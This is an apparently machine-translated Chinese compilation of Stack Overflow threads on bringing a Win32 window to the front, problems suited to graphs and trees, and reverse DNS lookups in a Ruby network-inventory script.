使用 win32 API 解决此问题的最佳方法是什么？我已经尝试过 SetForeground() 但它总是窃取焦点并且不能始终如一地工作。

解决此问题的最佳方法是什么？有什么想法吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-08-06T01:06:45.197

SetForegroundWindow 应该窃取焦点，并且在某些情况下它会失败。

> SetForegroundWindow 函数将创建指定窗口的线程置于前台并激活该窗口。键盘输入被定向到窗口

在拨打电话之前尝试使用[SetCapture](http://msdn.microsoft.com/en-us/library/ms646262.aspx)捕获焦点。还要研究将窗口置于前面的不同方法：SetForeGroundWindow、SetActiveWindow，甚至模拟鼠标点击也可以做到这一点。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-08-06T13:20:08.103

> SetForeGroundWindow、SetActiveWindow 和 BringWindowToTop 有什么区别？似乎他们都在做同样的事情。

根据 MSDN，SetForeGroundWindow 将激活窗口并将键盘焦点指向它。即使您的进程在后台，这也会尝试工作。SetActiveWindow 与 SetForeGroundWindow 做同样的事情，但如果您的应用程序不是最前面的应用程序，它不会做任何事情。最后，BringWindowToTop 只将窗口带到顶部，不会改变键盘焦点。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-06T01:37:37.710

您可以尝试使用 BringWindowToTop 函数来避免窃取焦点。我没有使用它，但它似乎是你正在寻找的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-08-24T21:51:34.570

您是否尝试过使用 SetWindowPos。这是在 Windows 中移动、调整大小和设置 z 顺序的规范函数。您可以使用一个 SWP_NOACTIVATE 标志。查看[http://msdn.microsoft.com/en-us/library/ms633545(VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms633545(VS.85).aspx)。我没有在属于另一个进程的窗口上尝试过这个，但它可能值得一试。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-12-18T07:23:12.393

SetWindowPos + SWP_NOACTIVATE 完成这项工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-05-06T14:44:47.903

您可以使用 FindWindow 获取窗口的 HWND，然后使用 Win32 API 中的 BringWindowToTop 函数。

# algorithm - 使用图和树可以解决或更容易解决哪些问题？

> ID：2988
> 
> 赞同：16
> 
> 时间：2008-08-06T00:56:05.937
> 
> 标签：algorithm, data-structures, tree, computer-science, graph-theory

这两种数据结构可以解决的最常见问题是什么？

对我来说，对以下书籍也有建议会很好：

*   实施结构
*   实施并解释使用它们的算法的推理

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-08-06T01:28:13.063

当我读到这个问题时，我首先想到的是：*什么类型的东西使用图/树？*然后我回想如何使用它们。

例如，以树的两种常见用法为例：

*   DOM
*   文件系统

DOM 和 XML 类似于树结构。
![替代文字](../Images/96d8dbb9bc736afc1298fdd50e27c8b1.png)

这也是有道理的。**这是有道理的，因为需要如何排列这些数据**。一个文件系统，也是。在 UNIX 系统上有一个根节点，并向下分支。当您安装一个新设备时，您就是将它附加到树上。

您还应该问自己：数据是否属于这种类型的结构？创建对问题有意义的数据结构，其余的将随之而来。

至于更容易，我认为这是相对的。您是否擅长使用递归函数来遍历树/图？如果你需要平衡树怎么办？

考虑一个解决单词搜索难题的程序。您可以将单词搜索的所有字母映射到图表中，并检查周围的节点以查看该字符串是否与任何单词匹配。但是你不能对单个数组做同样的事情吗？你真正需要做的就是移动一个索引来检查左右字母，并通过宽度来检查上下字母。用图表解决这个问题并不难，但如果你不习惯使用它们，它会带来很多额外的工作和困难——当然这不应该阻止你这样做，特别是如果你正在学习他们。

我希望这能帮助你思考这些结构。至于书籍推荐，我必须选择**[Introduction to Algorithms](https://rads.stackoverflow.com/amzn/click/com/0262032937)**。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-08-28T03:29:30.957

电路图。

编译（有向无环图）

地图。非常紧凑的图形。

网络流量问题。

专家系统的决策树（原文如此*）*

用于故障查找、流程改进、安全分析的鱼骨图。对于奖励积分，将您的错误恢复代码实现为*鱼*骨图的对象。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-09T13:54:37.803

几乎每个问题都可以用图论重写。我不是在开玩笑，看看任何关于 NP 完全问题的书，有一些非常古怪的问题会变成图论，因为我们有很好的工具来处理图......

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-08-12T20:59:54.327

[算法设计手册](https://rads.stackoverflow.com/amzn/click/com/0387948600)包含一些有趣的案例研究，创造性地使用了图表。尽管它的名字，这本书非常易读，有时甚至很有趣。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-08-06T01:18:12.773

我的大学有这样的课程：[CSE 326](http://www.cs.washington.edu/education/courses/326/)。我不认为这本书太有用了，但是这些项目很有趣，并且教你一些关于实现一些更简单的结构的知识。

例如，用树解决的最常见问题之一（按使用它的人数）是手机文本输入问题。您可以使用树（不一定是二元树）来表示可能的单词空间，这些单词可以来自用户快速输入的任何给定数字列表。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-08-08T15:46:05.617

[Java 算法：](https://rads.stackoverflow.com/amzn/click/com/0201361213) Robert Sedgewick 的第 5 部分是关于图算法和数据结构的。如果你想实现一些图算法，这将是一本很好的第一本书。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-08-08T15:58:36.530

用于在游戏和多媒体应用程序中绘制图形的场景图大量使用树和图。节点表示要渲染的对象、转换、控件、组...

场景图通常具有多个图层和属性，这意味着您只能以指定的顺序（图层）绘制图的某些节点（属性）。根据您拥有的场景图类型，它可以有两种并行结构：声明和实例化。钍

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-08-26T23:56:47.183

@DavidJoiner / 全部：

[FWIW：算法设计手册](https://rads.stackoverflow.com/amzn/click/com/1848000693)的新版本即将发布。

Skiena 教授为这本书开发的整个课程也可以在网上找到：

[http://www.cs.sunysb.edu/~algorith/video-lectures/2007-1.html](http://www.cs.sunysb.edu/~algorith/video-lectures/2007-1.html)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-03-09T13:25:49.603

由于它们的递归性质，树在函数式编程语言中使用得更多。

此外，图和树是对许多 AI 问题进行建模的好方法。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2010-07-01T11:11:32.107

游戏经常使用图表来帮助在游戏世界中寻找路径。世界的图形表示可以使用广度优先搜索或 A* 等算法来找到穿过它的路线。

他们还经常使用树来表示世界中的实体。如果您有数千个实体并且需要在某个位置找到一个实体，那么在列表中线性迭代可能效率低下，尤其是在您需要经常这样做的情况下。因此，可以将该区域细分为一棵树，以便更快地对其进行搜索。正如线性空间可以通过二叉搜索有效地搜索（并因此划分为二叉树），2D 空间可以划分为[四叉树](http://en.wikipedia.org/wiki/Quadtree)，3D 空间可以划分为[八叉树](http://en.wikipedia.org/wiki/Octree)。

# ruby - Ruby中的反向DNS？

> ID：2993
> 
> 赞同：22
> 
> 时间：2008-08-06T01:07:52.933
> 
> 标签：ruby, sockets, dns, nslookup

我所处的环境有很多尚未正确清点的计算机。基本上，没有人知道哪个 IP 对应哪个 MAC 地址和哪个主机名。所以我写了以下内容：

```
# This script goes down the entire IP range and attempts to
# retrieve the Hostname and mac address and outputs them
# into a file. Yay!

require "socket"

TwoOctets = "10.26"

def computer_exists?(computerip)
 system("ping -c 1 -W 1 #{computerip}")
end

def append_to_file(line)
 file   = File.open("output.txt", "a")
 file.puts(line)
 file.close
end

def getInfo(current_ip)
 begin
   if computer_exists?(current_ip)
     arp_output = `arp -v #{current_ip}`
     mac_addr = arp_output.to_s.match(/..:..:..:..:..:../)
     host_name = Socket.gethostbyname(current_ip)
     append_to_file("#{host_name[0]} - #{current_ip} - #{mac_addr}\n")
   end
 rescue SocketError => mySocketError
   append_to_file("unknown - #{current_ip} - #{mac_addr}")
 end
end

(6..8).each do |i|
 case i
   when 6
     for j in (1..190)
       current_ip = "#{TwoOctets}.#{i}.#{j}"
       getInfo(current_ip)
     end
   when 7
     for j in (1..255)
       current_ip = "#{TwoOctets}.#{i}.#{j}"
       getInfo(current_ip)
     end
   when 8
     for j in (1..52)
       current_ip = "#{TwoOctets}.#{i}.#{j}"
       getInfo(current_ip)
     end
 end
end 
```

除了找不到反向 DNS 外，一切正常。

我得到的示例输出是这样的：

```
10.26.6.12 - 10.26.6.12 - 00:11:11:9B:13:9F
10.26.6.17 - 10.26.6.17 - 08:00:69:9A:97:C3
10.26.6.18 - 10.26.6.18 - 08:00:69:93:2C:E2 
```

如果我这样做了，`nslookup 10.26.6.12`那么我会得到正确的反向 DNS，这表明我的机器正在查看 DNS 服务器。

我已经尝试过`Socket.gethostbyname`，，`gethostbyaddr`但它不起作用。

任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2011-04-04T21:52:07.477

今天我还需要反向 DNS 查找，我找到了非常简单的标准解决方案：

```
require 'resolv'
host_name = Resolv.getname(ip_address_here) 
```

似乎它使用超时，这有助于在粗糙的情况下。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-08-06T01:56:58.780

我会检查出来的`getaddrinfo`。如果您更换该行：

```
host_name = Socket.gethostbyname(current_ip) 
```

和：

```
host_name = Socket.getaddrinfo(current_ip, 0, Socket::AF_UNSPEC, Socket::SOCK_STREAM, nil, Socket::AI_CANONNAME)[0][1] 
```

该`getaddrinfo`函数返回一个数组数组。你可以阅读更多关于它的信息：

[Ruby 套接字文档](http://www.ruby-doc.org/stdlib/libdoc/socket/rdoc/classes/Socket.html#M004531)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-06T12:04:15.463

这也有效：

```
host_name = Socket.getaddrinfo(current_ip,nil)
append_to_file("#{host_name[0][2]} - #{current_ip} - #{mac_addr}\n") 
```

我不知道为什么`gethostbyaddr`也没有工作。